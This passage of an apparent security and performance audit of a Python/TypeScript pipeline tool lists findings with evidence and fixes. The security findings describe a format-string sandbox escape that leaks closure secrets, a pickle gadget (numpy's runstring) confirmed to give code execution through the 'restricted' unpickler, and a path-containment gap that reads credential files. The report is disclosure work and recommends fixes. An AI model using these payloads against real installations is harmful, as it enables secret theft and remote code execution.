Node contracts are pure functions of node.data.config and immutable within a plan, so caching is safe and removes the K-fold redo.

performance.title: User-code projection rules re-ast.parse and multi-walk the same code string several times per node
performance.description: For a single-parent Polars node, _single_parent_polars_expression_demands(code, ...) does ast.parse(code) once (line 1259), then runs _contains_rename_call (full ast.walk, 873-879), and if no rename, _contains_select_call (full ast.walk, 887-893) AND _references_derived_column (which internally does _derived_output_columns -> ast.walk 909, _referenced_polars_columns -> ast.walk 791, plus another ast.walk over select calls 947), then finally _unordered_expression_demands or _ordered_expression_demands (each another full ast.walk / iteration). That is 4-6 independent full traversals of the same AST per node. Separately, fan-in nodes call _join_calls_for_parent_inputs which does its OWN ast.parse(code) at line 1944 (a second parse of the same code), and join_parent_demands + PolarsFanInRule.parent_demands both call _join_calls_for_parent_inputs, re-parsing the code each time within a single node's processing.
performance.evidence: ast.parse appears at projection.py:1259, 1944 (and 512 for source code) — the 1944 parse re-parses code already parseable from the same node; _join_calls_for_parent_inputs is invoked from PolarsFanInRule.parent_demands at 1470 (joins) and again via join_parent_demands at 1482, and simple_join_calls_for_parent_inputs at 2018 — each call re-parses. _references_derived_column (927-958) alone triggers _derived_output_columns (ast.walk), _referenced_polars_columns (ast.walk), and a third select-scan ast.walk. ast.walk is a recursive generator over every node; running it 4-6x over one tree is pure constant-factor waste.
performance.when_it_bites: Bites per Polars feature-engineering / fan-in node WITH user code, proportional to code size. A typical pipeline has many such nodes; a node with a large with_columns/select body (dozens of expressions, common in pricing feature derivation) gets its AST walked 4-6 times and, for fan-in, parsed twice. On a ratebook/feature graph with hundreds of code-bearing Polars nodes evaluated on every plan(), the repeated walks dominate the planner's CPU. This is the clearest 'repeated graph walk' on the AST level called out in the focus.
performance.recommended_fix: Parse the node code once per node (cache the ast.Module on the node or in a per-sweep dict) and pass the tree into the rule helpers instead of re-parsing; combine the rename/select/derived-reference detection into a single ast.walk that collects all three signals in one pass; have PolarsFanInRule compute _join_calls_for_parent_inputs once and thread the result into join_parent_demands rather than letting each helper re-parse.

performance.title: strategy_summary_payload rebuilds a 5-way union node set and re-does diagnostics lookups per node on the preview-payload path
performance.description: strategy_summary_payload() materialises node_ids = sorted(set(needed_by_node) | set(materialisation_boundaries) | set(opaque_boundaries) | set(node_reasons) | set(opaque_reasons)) — five set() constructions plus a union plus a sort over every node (lines 159-165). It then loops every node calling _node_strategy(node_id), which itself does two dict .get() calls into diagnostics (133-135), and AGAIN fetches the same reason via diagnostics.node_reasons.get(node_id, diagnostics.opaque_reasons.get(...)) at 172-175 to populate the strategy dict — duplicating the lookup _node_strategy just performed. counts is accumulated for ALL nodes even though only max_nodes (100) strategies are retained.
performance.evidence: Lines 159-165 build/sort the full node-id set; 168-182 iterate it; _node_strategy (132-145) does diagnostics.node_reasons.get + opaque_reasons.get; lines 172-175 repeat the identical chained .get. For N nodes that is N x (2 + 2) dict lookups plus 5 full-set materialisations. The retained list is capped at 100 but the counts loop and the set unions are uncapped.
performance.when_it_bites: On the route/preview diagnostics path: strategy_summary_payload is called by diagnostics_payload to ship a compact summary to the UI. On a large ratebook (thousands of nodes) every preview that requests diagnostics re-materialises 5 full node-id sets and does ~4N dict lookups. It is bounded and not on the pure execution hot path, so low impact — but it is avoidable thrash when the same payload is requested repeatedly during interactive editing.
performance.recommended_fix: Build the node-id union once; in the loop compute the reason via a single .get and reuse it for both _node_strategy and the strategy dict (or have _node_strategy return (strategy, reason)). Optionally short-circuit the counts/strategies loop once both counts are stable and the retained cap is reached if exact per-strategy totals beyond the cap are not required.

performance.location: src/haute/projection.py:2152-2156 (compute_prepared_plan) vs 2245-2246 (parents_by_child.get) and rule entry points (e.g. 1283, 1318, 1441, 1578, 1942)
performance.title: parent_ids passed as a set then re-materialised with set(parent_ids)/list(parent_ids) inside nearly every rule
performance.description: compute_prepared_plan builds parents_by_child as dict[str, set[str]] (line 2152) and passes parent_ids = parents_by_child.get(node_id, set()) (line 2245) — already a set — into the rule pipeline. Almost every rule then defensively re-materialises it: OptimiserParentDemandRule `parent_set = set(parent_ids)` (662), OpaqueContractRule `set(parent_ids)` (1318), PolarsFanInRule `set(parent_ids)` (1441), EdgeJoinFanInRule `set(parent_ids)` (1578) plus sorted() of it (1580), SingleParentPolarsExpressionRule `list(parent_ids)` (1283), _join_calls_for_parent_inputs `set(parent_ids)` (1942), edge_join_fan_in_demands_for_node `set(parent_ids)` (1639) computed just to take len(). Because parent_demands_for_node tries the optimiser rule AND the single-parent rule, and the opaque/fan-in paths each re-set again, a single node can re-copy its parent set 3-5 times.
performance.evidence: Confirmed set()/list() re-materialisation sites: projection.py:662, 1283, 1318, 1441, 1578-1580, 1639, 1942. The input is already a set (2245). edge_join_fan_in_demands_for_node at 1639 does `len(set(parent_ids)) <= 1` purely to count, allocating a set to discard it. Each is O(P) for P parents and allocates a new container.
performance.when_it_bites: Per node, multiplied by the number of rule attempts. Negligible for the typical 1-3 parents per node, but on wide fan-in nodes (an edge-join or optimiser with many declared parents, or a big multi-source merge) the parent set is copied several times per node across rule attempts. Pure constant-factor; only worth tidying alongside the larger contract-memoisation change, not on its own.
performance.recommended_fix: Accept that parent_ids is already a set at the call site and pass it through (or normalise once to a frozenset in compute_prepared_plan and let rules consume it without re-copying). Replace `len(set(parent_ids)) <= 1` count-only checks with a length that does not allocate (e.g. operate on the already-set value).

performance.title: Every history-aware edit runs THREE full-graph O(total-config-size) passes (deep-clone + canonicalize-stringify + uncached panel-context stringify), not one
performance.description: The Phase-0 map (region-maps.json:1930 / leads/frontend.json:122) flagged this as a single 'JSON.stringify node.data.config per edit'. A full code-trace shows it is materially worse: each call to the history-aware setNodes/setEdges/setPreamble performs THREE independent traversals of the ENTIRE graph, not one, and one of them re-serializes preview result columns. Per single edit (e.g. one rating-table cell blur → updateTable → commitTables → handleConfigUpdate → onUpdateNode → setNodes): (1) pushSnapshotInternal()→captureGraphSnapshot()→cloneGraphValue() DEEP-CLONES every node and every edge — a full recursive walk and reallocation of every config object in the graph, including the N-1 nodes that did not change; (2) computePersistedFingerprint()→serializeSnapshot()→canonicalize() recursively key-sorts and rebuilds every node's entire data tree into fresh objects/arrays and then JSON.stringify()s the whole graph; (3) computePanelContextFingerprint()→panelContextNodeDataHash() JSON.stringify()s config + _columns + _availableColumns + _schemaWarnings for EVERY node with no memo cache. Only the 4th pass (computeStructuralFingerprint→shallowNodeDataHash) is WeakMap-cached so unchanged nodes are cheap there. The other three are not.
performance.evidence: setNodes body (442-466) calls, in one set(): pushSnapshotInternal() (414-421, clones whole graph via captureGraphSnapshot 123-131 → cloneGraphValue 133-154), computePersistedFingerprint (350-352 → serializeSnapshot graphSnapshot.ts:106-118 → canonicalize 78-88 rebuilds every nested object + JSON.stringify of all nodes/edges), computePanelContextPatch (393-405 → computePanelContextFingerprint 330-348 → panelContextNodeDataHash 321-328 with `parts.push(JSON.stringify(value))` per key per node, no WeakMap), and computeStructuralFingerprint (295-307). Three of these four are O(sum of all node config sizes); cloneGraphValue and canonicalize additionally allocate a full copy of the graph each. shallowNodeDataHash (shallowNodeHash.ts:88-99) is the only one with a per-data WeakMap.
performance.when_it_bites: A large ratebook RATING_STEP node holds config.tables as a cartesian product of factor levels (normaliseRatingTables/buildCartesianEntries, ratingTableUtils.ts:106-142): 3 factors × ~50 levels each ≈ 125k entry objects in one config. The editor commits the ENTIRE tables array on every single cell blur (RatingStepEditor.tsx:298-303 commitTables→updateTable; ControlledNumberCell commits onBlur). So each keystroke-commit deep-clones + canonicalizes + stringifies that ~MB-scale config two-to-three times plus once more for every other node in the graph. At ~10k+ total entries this is tens of ms of main-thread work per cell edit — perceptible input lag and GC churn while tabbing through a rating grid. Negligible for small graphs (<~1k total config entries).
performance.recommended_fix: Decouple the three concerns and stop re-walking unchanged nodes. (a) Replace cloneGraphValue with structuredClone, or — since history only needs an immutable reference and config objects are already replaced immutably by handleConfigUpdate (NodePanel.tsx:609-617) — store shallow snapshots (spread nodes/edges) rather than deep clones; the deep clone defends against React-Flow in-place mutation of position only, which a shallow {...n} already isolates. (b) Add a WeakMap<data,string> memo to panelContextNodeDataHash exactly as shallowNodeHash.ts already does, so only the edited node re-stringifies. (c) Consider deriving persistedFingerprint incrementally from the per-node structural hashes (which are already WeakMap-cached) instead of a fresh whole-graph canonicalize+stringify, or memoize serializeSnapshot per node. Each is independently safe and test-covered by the existing dirty/structuralVersion suites.

performance.title: Panel-context fingerprint re-JSON.stringifies every node's preview-result columns (_columns/_availableColumns) on every edit, with no memo cache
performance.description: computePanelContextFingerprint runs on every history-aware edit AND on every structural setNodesRaw/setEdgesRaw change (via computePanelContextPatch). Its per-node hash, panelContextNodeDataHash, includes the result-derived keys _columns, _availableColumns and _schemaWarnings in addition to config, and JSON.stringify()s each of them for EVERY node every time — there is no WeakMap cache (contrast shallowNodeDataHash which caches by data identity). So the cost is O(sum over all nodes of (config size + column-list size)). _columns/_availableColumns are full upstream/preview column schemas that can be large on wide ratebooks, and they change whenever a preview completes — coupling preview-completion churn into the per-edit panel-context hash.
performance.evidence: PANEL_CONTEXT_NODE_DATA_KEYS (309-319) lists `config`, `_columns`, `_availableColumns`, `_schemaWarnings`. panelContextNodeDataHash (321-328): `for (const key of ...) parts.push(value === undefined ? '' : JSON.stringify(value) ?? String(value))` — no caching. computePanelContextFingerprint (330-348) maps this over ALL nodes and sorts. Invoked from setNodes/setEdges (451,479), setNodesRaw/setEdgesRaw (549,576), undo/redo (661-664,692-695). Compare shallowNodeHash.ts:23-25,88-99 which memoizes via nodeDataHashCache WeakMap.
performance.when_it_bites: Graphs with many nodes carrying wide column schemas (e.g. a ratebook pipeline where each node's _availableColumns lists hundreds of columns). Every config keystroke-commit re-stringifies all of those column arrays for every node. Also fires redundantly every time any node's preview lands and writes _columns, bumping panelContextVersion and re-running usePanelGraphContext's full nodes.map(toSimpleNode) rebuild (usePanelGraphContext.ts:39-65). At ~50 nodes × ~200 columns this is a few ms of pure stringify per edit and per preview; trivial at small column counts.
performance.recommended_fix: Add a `const panelContextHashCache = new WeakMap<Record<string,unknown>, string>()` and short-circuit panelContextNodeDataHash on cache hit (same pattern as shallowNodeHash.ts). Because handleConfigUpdate and the preview writer both replace node.data immutably, the WeakMap keys are stable per logical version, so only nodes whose data object actually changed re-stringify. Optionally split column-schema identity out via columnFingerprint (utils/columnFingerprint.ts) instead of JSON.stringify of the full column arrays.

performance.title: setNodesRaw position-only fast path still recomputes the full-graph persisted fingerprint on every drag frame
performance.description: setNodesRaw is the path React Flow uses for mid-drag position events (the store docstring at lines 28-33 notes onNodesChange replays many position events per frame). It correctly skips history push and skips the structural fingerprint when only positions changed (hasOnlyNodePositionChanges → computeDirtyForPositionOnlyNodes, which is cheap). HOWEVER, that branch is reached only AFTER the UI-only check; the genuinely position-only branch at 530-534 returns early and is fine — but note the dirty derivation there (computeDirtyForPositionOnlyNodes 377-391) walks all nodes comparing saved positions each frame (O(N) per frame). This is bounded and far cheaper than the config-stringify path, so it is low impact; flagging only to confirm the drag path was checked and is NOT running the expensive serializeSnapshot/clone path. The expensive paths (computePersistedFingerprint at 536-540) are only hit when the change is NOT position-only or UI-only, i.e. on actual structural/config edits, which is correct.
performance.evidence: setNodesRaw (523-567): hasOnlyNodeUiFieldChanges→return {nodes} (527-529, cheapest); hasOnlyNodePositionChanges→return {nodes, dirty: computeDirtyForPositionOnlyNodes(state,nodes)} (530-534) where computeDirtyForPositionOnlyNodes (377-391)→hasSameSavedNodePositions (365-375) loops all nodes; only the fall-through (536+) calls computePersistedFingerprint/computeStructuralFingerprint. So drag frames avoid the clone+stringify path. Confirmed correct design.
performance.when_it_bites: Only at very large node counts (thousands) during a continuous drag would the per-frame O(N) position comparison in computeDirtyForPositionOnlyNodes/hasSameSavedNodePositions become noticeable. For typical graphs it is negligible. Included as a verified non-issue / lower bound rather than a defect.
performance.recommended_fix: No change required for realistic sizes. If thousands-of-nodes drags ever matter, short-circuit computeDirtyForPositionOnlyNodes when persistedFingerprint already differs from saved (it returns true immediately in that case at line 387, so only the all-clean case pays the O(N) walk). Leave as-is otherwise.

performance.title: usePanelGraphContext rebuilds the entire SimpleNode/SimpleEdge graph + nodeById Map on every config edit and every preview completion
performance.description: usePanelGraphContext memoizes on panelContextVersion, which (by design, finding above) bumps on every config edit and every preview-column write. On each bump it rebuilds the full snapshot: nodes.map(toSimpleNode) (spreading every node's data), edges.map(toSimpleEdge), and a fresh `new Map(allNodes.map(...))`. This is O(N nodes + E edges) of allocation per edit, feeding NodePanel's allNodes/nodeMap. It is correct and intentionally coarse (keyed away from position churn), but combined with the per-edit fingerprint passes it adds another full-graph allocation to each keystroke-commit. Lower impact than the stringify passes because it is plain object spreads (no JSON), but it does discard and rebuild the whole derived graph view even when only one node's config changed.
performance.evidence: buildSnapshotForVersion (51-55) pulls nodes/edges from getState and calls buildSnapshot (39-49): `nodes.map(toSimpleNode)` (toSimpleNode 14-27 spreads node.data), `edges.map(toSimpleEdge)`, `new Map(allNodes.map(node => [node.id, node]))`. useMemo dep is [panelContextVersion] only (59-65). panelContextVersion increments on every config-bearing edit (useGraphStore computePanelContextPatch 393-405) and whenever _columns/_availableColumns change.
performance.when_it_bites: Large graphs (hundreds of nodes/edges) where the user is actively editing config in a panel: each keystroke-commit triggers a full rebuild of allNodes + nodeById feeding the open panel. At ~50 nodes it is sub-millisecond; at several hundred nodes with the per-edit fingerprint work it compounds into the same input-lag window. Not a concern for small graphs.
performance.recommended_fix: If profiling shows this matters at scale, derive SimpleNode entries lazily/per-id (the only hot consumer is nodeMap[edge.source] lookups and the selected node), or memoize toSimpleNode per node.data via a WeakMap so unchanged nodes keep identity and the Map can be incrementally updated. Acceptable as-is for current graph sizes; primary fix is the fingerprint memoization above which reduces how often panelContextVersion churns.

performance.title: Ratebook rates table renders all levels of the selected factor without virtualization
performance.description: RatebookRatesTab renders one <tr> per row in selectedRows for the chosen factor inside a max-h-80 scroll container, with no windowing. For a high-cardinality factor (e.g. a postcode/vehicle factor with thousands of levels) this mounts thousands of DOM rows even though only ~15 are visible. Unlike DataPreview (which windows both rows via slice(startIdx,endIdx) and columns), this table has no virtualization. It is display-only and rebuilt only when a solve result lands (useMemo on factorTables), not per-edit, so it does not sit on the keystroke hot path — hence low impact — but it can still jank when the user opens the Rates tab on a many-level factor.
performance.evidence: selectedRows.map (111-123) renders every row; container is `overflow-auto max-h-80` (98). selectedRows is the full level list for one factor (44). levelCount across all factors is summed at 45. Contrast DataPreview.tsx:346 `data.preview.slice(startIdx, endIdx).map(...)` and :304 column windowing — the established virtualization pattern this tab does not use.
performance.when_it_bites: Opening the Ratebook Rates tab for a factor with thousands of levels (large geographic/vehicle rating tables). Rendering N thousand rows at once is a one-time layout/paint cost of tens to hundreds of ms and elevated memory; scrolling thereafter is fine because of max-h-80. Bounded factors (tens to low-hundreds of levels) are unaffected.
performance.recommended_fix: Apply the same scroll-window pattern DataPreview already uses (a startIdx/endIdx slice driven by scrollTop, rendering a top/bottom spacer), or only render the first K rows with a 'show more'. Reuse DataPreview's windowing approach for consistency. Low priority — it is off the per-edit path and only affects an explicitly opened display tab.

security.location: src/haute/_sandbox.py:239-243 (visit_Call only inspects ast.Name callees), 229-237 (visit_Attribute only sees literal dunder tokens), 102-109 ('format' present in _SAFE_BUILTINS); enabling sink _user_exec.py:51 exec(code, safe_globals(...), local_ns)
security.title: AST blocklist bypassed by str.format / format_map / format() template attribute traversal — arbitrary attribute read (closure secrets, __globals__) from shared/node pipeline code
security.description: The AST validator's entire dunder defence rests on seeing dunder names as literal `ast.Attribute.attr` tokens (`_BLOCKED_ATTRS`, `_BLOCKED_FRAME_ATTRS`) and blocked builtins as literal `ast.Name` call targets (`_BLOCKED_CALLS`). Python's string-formatting mini-language performs full attribute AND index traversal driven by a runtime *template string* that the AST never parses. `"{0.__closure__[0].cell_contents}".format(obj)`, `"{x.__globals__}".format_map({'x': obj})`, and `format(obj, spec)` therefore reach blocked dunders without ever emitting a blocked token. `str.format`/`format_map` are method calls whose callee is an `ast.Attribute`, so `visit_Call` (which only checks `isinstance(node.func, ast.Name)`) never inspects them, and the builtin `format` is left in `_SAFE_BUILTINS` (not in `_BLOCKED_BUILTINS`). I verified against the real `validate_user_code`/`safe_globals`: `"{0.__closure__[0].cell_contents}".format(helper)` PASSES validation and at runtime returns the closure secret `SECRET-TOKEN-12345`, while the byte-identical normal access `helper.__closure__[0].cell_contents` is BLOCKED with UnsafeCodeError. `"{0.__globals__}".format(fn)` dumps the function's entire module globals dict (rendered to string, including the `__builtins__` entry). This is a clean, reliable read-primitive escape of the documented sandbox. It is bounded to INFO-LEAK (not RCE): `format()` coerces every field to `str`, so it cannot invoke methods or return live objects, and I confirmed no live-attribute or eval primitive remains in the restricted builtins (`getattr`/`vars`/`dir`/`type`/`hasattr`/`eval`/`exec`/`compile`/`__import__` are all removed), and `string.Formatter` is not importable. So the leaked `__globals__`/`__subclasses__()` text is a string, not a callable, and cannot be re-entered to execute code through pure formatting. Not previously reported (existing _sandbox findings cover the pickle allowlist breadth #59, the joblib find_class race V031, and the unbounded validation cache #60 — none mention format-string traversal).
security.exploit_scenario: Ralph imports/opens a SHARED pipeline (or an imported submodel) authored by someone else. One of its polars/explore/externalFile nodes contains transform code such as `leak = '{0.__globals__}'.format(helper)` or `secret = '{0.__closure__[0].cell_contents}'.format(util_fn)`, where `helper`/`util_fn` is any in-scope callable — notably the preamble helper functions the executor injects into node code via `extra_ns`/`_preamble` (see _builders.py:599/692/724/831 and _user_exec.py:51), or `pl` internals. validate_user_code passes (no blocked token appears in the AST), exec runs, and the node's resulting `df`/value now embeds the stringified contents of that function's `__globals__` (module-internal paths, in-memory config, environment-derived constants) or a closure cell secret (e.g. a Databricks token captured in a preamble closure). The attacker exfiltrates it by writing it into an output column, a dataSink path, or any value the shared pipeline surfaces back to the operator. The AST sandbox — whose stated purpose (module docstring) is to 'close known CPython sandbox-escape vectors at the structural level' including '__class__, __subclasses__' — provides no protection against this read path.
security.recommended_fix: Treat string-formatting attribute traversal as a first-class escape vector. Minimal hardening: (1) In `_ASTValidator.visit_Call`, also reject calls whose callee is an `ast.Attribute` with `attr in {'format', 'format_map', 'format_field', 'vformat', 'get_field'}` (the str/Formatter traversal surface), and add `format` to `_BLOCKED_BUILTINS`/`_BLOCKED_CALLS`. (2) Because `"...".format(...)` on a literal is the common legitimate case, prefer parsing format-template string constants: walk every `ast.Constant`/`JoinedStr` that is the receiver of a `.format`/`.format_map` call and run the field-name/`{x.attr}` parts through the same `_BLOCKED_ATTRS`/`_BLOCKED_FRAME_ATTRS` check (use `string.Formatter().parse` to extract `field_name`, then reject any `.__dunder__` or `[...]` segment touching a blocked attr). (3) Add adversarial regression tests mirroring the existing TestFormatStringExploitation class but for `str.format`/`format_map`/`format()` template traversal (closure leak, __globals__ leak, __subclasses__ enumeration) asserting UnsafeCodeError. The deeper fix is to move off the denylist (see boundary_assessment): an allowlist AST (permit only a vetted set of node types/attributes) would make this whole class unrepresentable.

security.title: AST validator is a denylist with several reachable-but-unblocked dunders (__getattribute__, __base__, __subclasshook__, __class_getitem__, __getstate__/__setstate__, __init__) — fragile by construction
security.description: The sandbox is structurally a DENYLIST: `visit_Attribute` only rejects names present in the hand-maintained `_BLOCKED_ATTRS`/`_BLOCKED_FRAME_ATTRS` sets, and everything else is permitted. I empirically confirmed (against the real validator) that the following dunders PASS validation today: `__getattribute__` (the sibling of the blocked `__getattr__`, and a general attribute-read primitive), `__base__` (singular form of the blocked `__bases__`), `__subclasshook__`, `__class_getitem__`, `__getstate__`/`__setstate__`, `__call__`, `__delitem__`, `__objclass__`, `__defaults__`/`__kwdefaults__`, `__wrapped__`, plus the already-test-documented `__init__`/`__qualname__`/`__annotations__`/`__name__`. Individually most are low value while the runtime builtins stay locked (no `getattr`/`eval`/`type` to convert a read into execution), and the format-string vector (separate finding) already grants full read traversal, so these are not independently critical. They are reported as a class to document that the denylist has demonstrable holes and is inherently incomplete: every future CPython version that adds a dunder, and every traversal helper not enumerated, is permitted by default. This is the architectural weakness behind the format-string finding.
security.exploit_scenario: A shared/imported pipeline node uses `obj.__getattribute__('__class' + '__')`-style or `cls.__base__`/`__subclasshook__` traversal to walk toward interesting objects. With the current locked runtime builtins this stays a read/leak rather than RCE, but it widens the leak surface beyond what the blocklist authors enumerated, and any future relaxation of the runtime builtins (e.g. someone adds `getattr` back for ergonomics, or an `allow_imports`-style flag spreads) immediately turns these permitted reads into an execution chain. The danger is the maintenance burden: the protection silently weakens as Python evolves, with no test that fails when a new escape-relevant dunder appears.
security.recommended_fix: Invert the model to an ALLOWLIST where feasible: in `visit_Attribute`, reject ALL names matching `^__.*__$` except a small vetted allowlist of provably-safe dunders actually needed by pipeline code (e.g. `__len__`); this single change subsumes the entire current `_BLOCKED_ATTRS` set and closes the whole future-dunder class at once (the existing tests for `__init__`/`__qualname__`/etc. being 'allowed' would need re-evaluation — those allowances are themselves a liability). If staying with a denylist short term, at minimum add `__getattribute__`, `__base__`, `__subclasshook__`, `__class_getitem__`, `__getstate__`, `__setstate__`, `__call__`, `__objclass__` to `_BLOCKED_ATTRS`, and add a CI test that enumerates `dir(object)`/`dir(type)`/function/generator dunders and asserts every escape-relevant one is blocked, so a Python upgrade that introduces a new traversal dunder fails loudly.

security.location: src/haute/_sandbox.py:346-394 (_ALLOWED_PICKLE_PREFIXES single-segment ('numpy',) entry + _pickle_global_is_allowed prefix match); gate at 405-413 (_RestrictedUnpickler.find_class) and 454-463 (joblib find_class); reached via safe_unpickle 416-425 / safe_joblib_load 431-472
security.title: RestrictedUnpickler allowlist admits real RCE gadgets via whole-package numpy entry — arbitrary code execution through safe_unpickle AND safe_joblib_load (not merely object construction)
security.description: The pickle allowlist is built from whole-package single-segment prefixes. _pickle_global_is_allowed('numpy', <anything>) and _pickle_global_is_allowed('numpy.<any.submodule>', <anything>) return True — find_class filters ONLY by module prefix, never by qualname. The numpy package tree contains direct code-execution primitives reachable as pickle globals, and pickle's REDUCE opcode invokes whatever callable find_class returns with attacker-controlled arguments. The cleanest gadget is numpy.testing._private.utils.runstring, whose entire body is `def runstring(astr, dict): exec(astr, dict)` — i.e. it IS exec, with both arguments attacker-supplied. numpy.testing ships with base numpy (no dev/test extra; confirmed importing on this repo's runtime, numpy 2.4.2), so it is present in every haute install. A second gadget, numpy.distutils.exec_command.exec_command, spawns a subprocess (works on Python < 3.12). I verified end-to-end on this machine: a pickle whose ONLY global is ('numpy.testing._private.utils','runstring') — confirmed via pickletools.genops, all globals allowlisted=True — when loaded through the real safe_unpickle executed `import os; open(sentinel,'w').write('rce:'+str(os.getpid()))`, writing a sentinel file containing the live PID. The identical payload loaded through safe_joblib_load (which patches joblib's NumpyUnpickler.find_class with the same allowlist) ALSO executed and wrote its sentinel. Note 'os' never appears as a pickle global — it is imported inside the exec'd string — so module-name allowlisting cannot see it. This directly refutes existing finding #59's conclusion that 'the catastrophic RCE class is contained; only allowlisted ML-library object construction is not.' #59 demonstrated only forged-estimator state injection and assumed no exec/subprocess primitive was reachable; this finding shows a single allowlisted global yields full arbitrary code execution. This is a NEW, distinct, and far more severe issue than #59's construction/state-injection.
security.exploit_scenario: An externalFile node carries a `path` + `fileType` ('pickle' or 'joblib') in pipeline/submodel config. In the trust model's SHARED/imported-pipeline and deploy-bundle cases, the artifact bytes at that path cross a trust boundary: (a) a shared pipeline ships a bundled freq.pkl/model.joblib next to its config; (b) an imported submodel references an attacker-authored artifact; (c) the deploy scorer (src/haute/deploy/_scorer.py:510) loads a REMAPPED MLflow bundle artifact via load_external_object after unpacking it from the registry. The attacker crafts the .pkl/.joblib so its __reduce__ returns (numpy.testing._private.utils.runstring, ('<arbitrary python>', {})). The victim merely runs/previews the shared pipeline (dev executor: src/haute/_builders.py:723 -> load_external_object -> safe_unpickle/safe_joblib_load) or serves the deployed model. validate_project_path only checks the path resolves inside the project root — it does not inspect bytes — and the RestrictedUnpickler waves the single numpy global through. The embedded code runs with the operator's full privileges (read .env/Databricks tokens, exfiltrate data, modify rating logic, drop a backdoor). No os/subprocess/eval global appears in the pickle, so any audit that greps the artifact for obvious RCE module names sees nothing. The operator believes the 'restricted' unpickler protected them.
security.recommended_fix: Stop allowlisting by module prefix; whole-package entries are unsafe because large library trees inevitably contain exec/subprocess/loader gadgets (numpy.testing.runstring, numpy.distutils.exec_command, numpy.ctypeslib.load_library, pandas.core.computation.eval.eval, etc.). Replace _ALLOWED_PICKLE_PREFIXES with an explicit, exhaustive set of (module, qualname) pairs for the concrete classes actually persisted by haute's own save paths (e.g. numpy._core.multiarray._reconstruct / ndarray / dtype, the specific sklearn estimator classes used, scipy.sparse matrix types, the catboost/rustystats wrappers) and reject every other qualname — including ones under numpy/sklearn/etc. As defense-in-depth and the real fix for attacker-influenced artifacts, add integrity/provenance verification before loading any pickle/joblib that can cross a trust boundary: sign the deploy/import bundle manifest, or pin an allowlist of artifact content-hashes captured at build/registration time (content_hash in _io.py is currently a cache key only, not an authenticity check). Where feasible, migrate persisted estimator state to a non-code-bearing format. Add a regression test that asserts safe_unpickle/safe_joblib_load BLOCK a payload whose sole global is numpy.testing._private.utils.runstring (and numpy.distutils.exec_command.exec_command), proving the gadget class is rejected rather than merely that os.system is rejected.
security.category_note: Verified end-to-end on repo runtime; sentinel file written with live PID via both safe_unpickle and safe_joblib_load. Distinct from existing finding #59 (object construction/state injection, which concluded RCE was contained).

security.title: Route input-path guard omits modelScore feature_contract_path / artifact_path, so even guarded preview/trace/sink routes read an out-of-root file with zero containment
security.description: The HTTP route guard `_validate_runtime_input_paths` (called by the preview, trace, and sink routes) only enforces project-root containment for the `path` field of apiInput/dataSource/externalFile nodes plus `artifact_path` of file-sourced optimiserApply nodes. Its coverage map `_RUNTIME_INPUT_PATH_CONFIG_BY_NODE_TYPE` does NOT include MODEL_SCORE at all. Yet the executor's own field map `_LOCAL_RUNTIME_INPUT_PATH_FIELDS_BY_NODE_TYPE[NodeType.MODEL_SCORE] = ('artifact_path','feature_contract_path')` shows the engine treats both modelScore file fields as runtime inputs. `feature_contract_path` is read with NO containment anywhere in the chain: `_runtime_file_signature_paths` resolves it via `resolve_runtime_file_path(..., prefer='project')` (enforce_project_root defaults False) and then `_stat_gated_runtime_path_fingerprint` -> `_runtime_path_fingerprint` -> `content_hash(resolved)` reads the ENTIRE file to build the preview/trace cache key on every request; and during scoring `ModelScorer._categorical_levels_for_score` calls `load_contract(self.feature_contract_path)` which does `Path(path).read_text()`. I confirmed by code-path tracing and isolated execution that (a) `_validate_runtime_input_paths` PASSES a modelScore node whose `feature_contract_path` is an absolute out-of-root path, and (b) `load_contract` opens and JSON-parses that out-of-root file (the resulting FeatureMismatchError for 'missing required fields' proves the file was read). This is distinct from prior finding #30 / platform__executor-path-resolution-no-enforce-project-root: that finding is about the `path` field on dataSource/apiInput/externalFile and about the train/optimiser routes lacking the guard ENTIRELY; it does not identify that the guard's coverage map itself omits modelScore, so the gap exists even on the routes that DO call the guard.
security.exploit_scenario: A user opens a SHARED/imported pipeline `.py` (or its serialized graph) authored by an attacker. It contains a modelScore node with `sourceType` configured and `feature_contract_path` set to an absolute out-of-project path such as `/home/op/.aws/credentials`, `C:\Users\op\.ssh\id_rsa`, or a sibling project's secret contract. The operator clicks Preview or Trace on a node downstream of (or at) that modelScore node. The preview route calls `_validate_runtime_input_paths`, which passes the node unchecked (modelScore not in its map). The executor then content-hashes the out-of-root file to compute the cache key, and scoring calls `load_contract`, both reading the file. Although the file content is not directly returned, its bytes influence the cache fingerprint and any contract-shape mismatch is surfaced verbatim in the HTTP error (path + parsed structure), and the read itself can be used as an existence/size oracle and to trigger reads of arbitrary host files from a route the operator believes is path-contained.
security.recommended_fix: Make containment a property of the execution boundary, not a per-route allow-map. Concretely: (1) replace the route guard's hand-maintained `_RUNTIME_INPUT_PATH_CONFIG_BY_NODE_TYPE` with the executor's authoritative `_runtime_file_signature_paths` / `_runtime_input_path_fields` enumeration so the guard validates exactly the fields the engine reads (including modelScore `artifact_path`/`feature_contract_path`); (2) add an `is_relative_to(_get_project_root())` gate inside `load_contract`/`load_contract_cached` (or resolve `feature_contract_path` through `resolve_runtime_file_path(..., enforce_project_root=True)` before reading), so the read fails loudly even when reached from the unguarded train/optimiser routes; (3) per CLAUDE.md, add a failing test first: a preview/trace request with a modelScore node whose feature_contract_path is out-of-root must 403, mirroring tests/test_pipeline_runtime_path_validation.py.
security.boundary_note: Reachable on the guarded routes that are explicitly supposed to be contained; arbitrary host-file content read/oracle when a pipeline is shared/imported.

security.title: _normalise_path_text backslash->slash rewrite diverges from the executor read guard on POSIX and corrupts Windows extended-length/device paths
security.location: src/haute/_path_resolution.py:11-21 (_normalise_path_text) used by resolve_runtime_file_path:86-99; contrast src/haute/_io.py:141-147 (_validate_source_path uses Path(path).parts with NO backslash normalisation) and src/haute/routes/_helpers.py:78-102 (validate_safe_path also does not normalise backslashes)
